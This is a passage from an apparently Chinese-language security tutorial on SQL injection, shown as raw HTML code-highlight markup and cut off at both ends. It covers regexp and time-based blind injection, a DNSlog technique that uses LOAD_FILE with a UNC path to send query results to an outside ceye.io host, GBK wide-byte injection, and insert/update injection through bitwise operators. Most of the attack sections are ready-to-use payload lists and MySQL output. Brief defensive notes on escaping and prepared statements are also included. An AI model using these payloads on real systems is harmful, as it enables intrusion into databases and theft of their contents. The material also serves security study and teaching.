class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name from math where id&#x3D;3;</span><br><span class="line">+-----------+</span><br><span class="line">| name      |</span><br><span class="line">+-----------+</span><br><span class="line">| chengxian |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^c&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^c&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;^s&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;^s&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             0 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;n$&#39;;</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;n$&#39; |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">|                                             1 |</span><br><span class="line">+-----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select name from math where id&#x3D;3) regexp&#39;an$&#39;;</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">| (select name from math where id&#x3D;3) regexp&#39;an$&#39; |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                                              1 |</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp &#39;^[a-z]&#39;  #判断一个表的第一个字符串是否在a-z中</span><br><span class="line">regexp &#39;^r&#39;      #判断第一个字符串是否为r</span><br><span class="line">regexp &#39;^r[a-z]&#39; #判断一个表的第二个字符串是否在a-z中(这里可以使用二分法)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>提高盲注速度</p><p>DNSlog+盲注</p><p><code>https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</code></p><p>原理：</p><p>Dnslog就是存储在DNS Server上的域名信息，它记录着用户对域名<a href="http://www.test.com、t00ls.com.等的访问信息./">www.test.com、t00ls.com.等的访问信息。</a></p><p>通过合适的sql语句，在数据库中执行之后，一条带有数据库查询结果的域名就被提交到DNS服务器进行解析。</p><p>可以查看DNS服务器上的Dnslog就可以得到SQL注入结果。<a href="http://ceye.io上我们可以获取到有关`ceye.io`的dns查询信息./">http://ceye.io上我们可以获取到有关`ceye.io`的DNS查询信息。</a></p><p>在域名解析的过程中，是由顶级域名向下逐级解析的，我们构造的攻击语句也是如此，当它发现域名中存在<code>ceye.io</code>时，它会将这条域名信息转到相应的NS服务器上，而通过<a href="http://ceye.io我们就可以查询到这条dns解析记录./">http://ceye.io我们就可以查询到这条DNS解析记录。</a></p><p>Microsoft SQL Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。UNC命名被应用于在局域网中访问文件服务器或者打印机，Windows系统的UNC语法具有通用的形式：  \\ComputerName\SharedFolder\Resource</span><br><span class="line"></span><br><span class="line">攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。</span><br></pre></td></tr></table></figure><p>  条件：</p><p>  1、secure_file_priv为空</p><p>  2、目标系统是windows，能够使用UNC路径</p><p>  实例：</p><p>  构造sql语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(select database(),&#39;mysql.cmr1ua.ceye.io\\abc&#39;)))</span><br></pre></td></tr></table></figure><p>四个\，其中两个用来转义。<br>DNSlog平台接受信息<br><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200911100714531.png" alt="image-20200911100714531"></p></li></ul><h6 id="常用payload-1"><a href="#常用payload-1" class="headerlink" title="常用payload"></a>常用payload</h6><p>布尔盲注</p><p>判断数据库的类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">1&#x27; and exists(<span class="keyword">select</span>*<span class="keyword">from</span> information_schema.tables) <span class="comment">#</span></span><br><span class="line">//判断是否是 <span class="keyword">access</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and exists(select*from msysobjects) #</span></span><br><span class="line"><span class="string">//判断是否是 Sqlserver数据库</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span>*<span class="keyword">from</span> sysobjects) <span class="comment">#</span></span><br><span class="line">//判断是否是<span class="keyword">Oracle</span>数据库</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and (select count(*) from dual)&gt;0 #</span></span><br></pre></td></tr></table></figure><p>判断数据库长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length(database())&gt;5 </span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断数据库中是否存在某个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select*from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中表的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(table_name) from information_schema.tables where table_schema&#x3D;database())&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&#x3D;6</span><br></pre></td></tr></table></figure><p>判断数据库中表的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;100 #</span><br></pre></td></tr></table></figure><p>判断数据库中的表中是否存在某个字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and exists(select username from admin)</span><br></pre></td></tr></table></figure><p>判断数据库中的表的字段的数量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and (select count(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)&gt;5 #</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断数据库中表的字段的名字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1),1,1))&gt;100</span><br></pre></td></tr></table></figure><p>判断字段中的数据的长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; and length((select id from users limit 0,1))&gt;5</span><br></pre></td></tr></table></figure><p>判断字段中的数据的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">100</span></span><br></pre></td></tr></table></figure><p>时间盲注</p><p>判断时间盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=5,1,sleep(5)) <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>判断数据库的名字</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substring(database(),1,1))&lt;100,1,sleep(5)) #</span><br></pre></td></tr></table></figure><p>同理数据库的表、字段、值。</p><h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>造成宽字节注入的原因是编码转换，应用程序的编码与数据库的编码不一致，编码转换导致的引号逃逸。</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0x81-0xFE，尾字节对应0x40-0xFE（除0x7F），刚好涵盖了对应的编码0x5C。</p><p>比如客户端php的编码为UTF-8，而mysql通过set name ‘GBK’设置编码，导致两者的编码不一样，在进行编码转换的时候出现了宽字节注入。</p><p>应用程序的编码</p><p>以php为例子，使用者输入数据后，会通过php的默认编码生成sql语句发送给服务器。在php没有开启<code>default_charset</code>编码时，php的默认编码为空，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">; PHP&#39;s built-in default is text&#x2F;html</span><br><span class="line">default_mimetype &#x3D; &quot;text&#x2F;html&quot;</span><br><span class="line">;default_charset &#x3D; &quot;iso-8859-1&quot;</span><br></pre></td></tr></table></figure><p>此时php会根据数据库中的编码自动来确定使用那种编码，可以使用<code>&lt;?php $m=&quot;字&quot;; echo strlen($m);?&gt;</code> 来进行判断，如果输出的值是3说明是<code>utf-8</code>编码。如果输出的值是2说明是<code>gbk</code>编码；</p><p><code>SET NAMES &#39;GBK&#39;</code>语句与这三个语句等价：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;SET character_set_client &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_results &#x3D;&#39;GBK&#39;;</span><br><span class="line">mysql&gt;SET character_set_connection &#x3D;&#39;GBK&#39;;</span><br></pre></td></tr></table></figure><p>三个语句的作用是：</p><p>当我们的mysql接受到客户端的数据后，会认为他的编码是character_set_client，然后会将之将换成character_set_connection的编码，然后进入具体表和字段后，再转换成字段对应的编码。</p><p>当查询结果产生后，会从表和字段的编码，转换成character_set_results编码，返回给客户端。</p><p>使用<code>addslashes</code>函数或是开启<code>PHPGPC</code>（注：<code>在php5.4已上已给删除</code>，并且需要说明特别说明一点，GPC无法过滤<code>$_SERVER</code>提交的参数）时过滤GET、POST、COOKIE、REQUSET 提交的参数时，我们使用的预定义字符会给转义成添加反斜杠的字符串如下面的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">单引号（&#39;）&#x3D; （\&#39;）</span><br><span class="line">双引号（&quot;） &#x3D; （\&quot;）</span><br><span class="line">反斜杠（\） &#x3D; （\\）</span><br></pre></td></tr></table></figure><p>比如我们输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;%df%27</span><br></pre></td></tr></table></figure><p>会被进行如下转换</p><p>%df%27===(addslashes)===&gt;%df%5c%27===(数据库GBK)===&gt;運’ </p><p>因为数据库设置了<code>GBK</code>编马，即是在汉字编码范围内两个字节都会给重新编码为一个汉字。即是<code>%df%5c</code>转换成了汉字<code>運</code>，而单引号就逃逸了出来，从而造成了注入漏洞。</p><p>防御：</p><p>对于宽字节编码，有一种最好的修补就是：</p><p>（1）使用mysql_set_charset(GBK)指定字符集</p><p>（2）使用mysql_real_escape_string进行转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理是，mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面%df和5c拼接为一个宽字节的问题，就是使用mysql_set_charset进行指定，他会指定当前连接的字符集。</span><br></pre></td></tr></table></figure><p>（3）character_set_client设置成binary，就不存在宽字节或多字节的问题了，所有数据以二进制的形式传递，就能有效避免宽字符注入。</p><h4 id="PDO技术"><a href="#PDO技术" class="headerlink" title="PDO技术"></a>PDO技术</h4><p>mysql的预编译</p><p>当采用预编译操作时，首先将待执行的SQL，语句中的参数值用占位符替代。当带着占位符的SQL<br>语句模板被数据库编译、解析后，再通过向占位符绑定参数进行查询操作。</p><p>模拟预处理</p><p>模拟预编译是防止某些数据库不支持预编译而设置的(如sqllite与低版本mysql)。如果模拟预处理开启，那么客户端程序内部会模拟mysql数据库中的参数绑定这一过程。也就是说，程序会在内部模拟prepare的过程，当执行execute时，再将拼接后的完整SQL语句发送给mysql数据库执行</p><p>模拟预处理并没有实现SQL模板与参数的分离，但的确可以防止sql注入。模拟预处理防止sql注入的本质是在参数绑定过程中对参数值进行转义与过滤,这一点与真正的sql数据库预处理是不一样的。理论上，sql数据库预编译更加安全一些。</p><p>非模拟预处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PDO::ATTR_EMULATE_PREPARES =&gt; <span class="literal">false</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = [</span><br><span class="line">    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,</span><br><span class="line">    PDO::ATTR_EMULATE_PREPARES  =&gt; <span class="literal">false</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:dbname=cat;host=127.0.0.1;&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, $params);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    $link = $db-&gt;prepare(<span class="string">&#x27;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (\PDOException $e) &#123;</span><br><span class="line">    var_dump($e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用非模拟预编，非模拟预编译不会像模拟预编呢样在PDO内部会模拟参数绑定的过程，</p><p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p><p>在发送带有占位符的sql语句到数据库的时候这时候就已经发生了错误。进行了报错。</p><p>预编译可以完全杜绝注入攻击吗</p><p>在预编译阶段即prepare阶段，sql语句的模板中参数名可控，导致的sql注入。</p><p>总结</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、使用PDO时尽量使用非模拟预处理。</span><br><span class="line">2、创建PDO实例时将PDO::MYSQL_ATTR_MULTI_STATEMENTS设置为false，禁止多语句查询。</span><br><span class="line">3、SQL语句模板不使用变量动态拼接生成</span><br></pre></td></tr></table></figure><p>关于orderby不能参数化查询的问题</p><p>原因：</p><ul><li><p>order by后面拼接字段名，字段名不能加引号。</p></li><li><p>在进行预编译的时候，我们替换占位符的时候字段串会自动加上引号，比如java的setString方法。</p></li></ul><h5 id="insert、update注入"><a href="#insert、update注入" class="headerlink" title="insert、update注入"></a>insert、update注入</h5><h6 id="利用报错注入"><a href="#利用报错注入" class="headerlink" title="利用报错注入"></a>利用报错注入</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into steady(p_name,p_number,p_owner,p_ney,sqdate) values( &#39;te1st&#39;,&#39;51&#39;,&#39;Olivia&#39; or 注入语句</span><br><span class="line"> or&#39;&#39;,&#39;test123&#39;,&#39;1511241494&#39;) -- </span><br></pre></td></tr></table></figure><h6 id="无回显注入-盲注"><a href="#无回显注入-盲注" class="headerlink" title="无回显注入(盲注)"></a>无回显注入(盲注)</h6><ul><li><p>利用xor、||、&amp;&amp;、+,-,*,/</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (sleep(10));</span><br><span class="line">+-------------+</span><br><span class="line">| (sleep(10)) |</span><br><span class="line">+-------------+</span><br><span class="line">|           0 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set (10.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into steady values (0 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 &amp;&amp; sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 || sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (0 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.09 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into steady values (1 xor sleep(2),&#39;test&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (2.01 sec)</span><br></pre></td></tr></table></figure><p>配合if、substr等函数进行盲注。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;r&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into  math values(0 || if(substr(user(),1,1)&#x3D;&#39;b&#39;,sleep(0),sleep(10)),&#39;444&#39;);</span><br><span class="line">Query OK, 1 row affected (10.00 sec)</span><br></pre></td></tr></table></figure></li></ul><h6 id="有回显注入-符号"><a href="#有回显注入-符号" class="headerlink" title="有回显注入(符号)"></a>有回显注入(符号)</h6><ul><li><p>实例：</p><p>按位或、按位异或受收到字段类型的限制，比如一下表中的id字段，id字段只允许10个长度，我们想要的数据有时候超过10个长度。</p><p>这时候我们需要使用substr函数去截取制定的字段，然后在使用hex。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">#int型按位或</span><br><span class="line">mysql&gt; insert into steady values (0 | (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from steady;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657374 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">#int型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ^ (select hex(database())),&#39;0&#39;,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| userid   | username | signature | mood |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">| 74657338 | 0        | test      | 0    |</span><br><span class="line">+----------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(100^74657338);</span><br><span class="line">+---------------------+</span><br><span class="line">| unhex(100^74657338) |</span><br><span class="line">+---------------------+</span><br><span class="line">| test                |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#字符型按位或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;0&#39;| (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657374 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(74657374);</span><br><span class="line">+-----------------+</span><br><span class="line">| unhex(74657374) |</span><br><span class="line">+-----------------+</span><br><span class="line">| test            |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#字符型按位异或</span><br><span class="line">mysql&gt; insert into ctf values (100 ,&#39;100&#39; ^ (select hex(database())) ,&#39;test&#39;,&#39;0&#39;);</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf;</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">| userid | username | signature | mood |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">|    100 | 74657338 | test      | 0    |</span><br><span class="line">+--------+----------+-----------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line">mysql&gt; select unhex(&#39;100&#39;^74657338);</span><br><span class="line">+-----------------------+</span><br><span class="line">| unhex(&#39;100&#39;^74657338) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| test                  |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>mysql运算符</p><ul><li><p>按位或运算符–｜</p><p>0与任意的数字b或都为b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; mysql&gt; select (0|1);</span><br><span class="line">+-------+</span><br><span class="line">| (0|1) |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|2323);</span><br><span class="line">+----------+</span><br><span class="line">| (0|2323) |</span><br><span class="line">+----------+</span><br><span class="line">|     2323 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0|452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0|452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>按位异或运算符–^</p><ul><li><p>0与任意的数字b异或都是b</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (0^452323);</span><br><span class="line">+------------+</span><br><span class="line">| (0^452323) |</span><br><span class="line">+------------+</span><br><span class="line">|     452323 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (0^5644);</span><br><span class="line">+----------+</span><br><span class="line">| (0^5644) |</span><br><span 